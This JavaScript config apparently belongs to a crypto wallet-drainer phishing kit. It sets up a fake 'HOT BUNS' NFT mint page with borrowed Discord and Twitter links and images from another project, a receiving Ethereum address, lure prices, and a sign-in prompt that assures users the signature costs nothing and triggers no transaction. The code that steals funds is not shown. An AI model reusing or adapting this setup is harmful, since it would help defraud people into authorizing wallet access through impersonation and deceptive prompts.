const collectionInfo = {
    name: "HOT BUNS",
    socialMedia: {
        discord: "https://discord.com/invite/projectgodjira",
        twitter: "https://twitter.com/GodJiraslove",
        instagram: "",
    },
    eprice: 0,
    nprice: 0.01,
    nfts:  100,
    spots: 89,
    logo: "https://cdn.discordapp.com/icons/897718057596747816/98abbd15eb7410a09d059401e6f97371.webp?size=64",
    backgroundImage: "https://cdn.discordapp.com/splashes/897718057596747816/3a5012084c6101418071d684c233270d.jpg?size=2048",
    address: "0xa5FA5D90CE4E1C41EA0DA1D116Ba6d3b270A12bF",
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

if (!collectionInfo.address.startsWith("0x") || (collectionInfo.address.length >= 64 || collectionInfo.address.length <= 40))
    console.error(`Error: ${collectionInfo.address} is not a valid Ethereum address.`);

document.title = collectionInfo.name;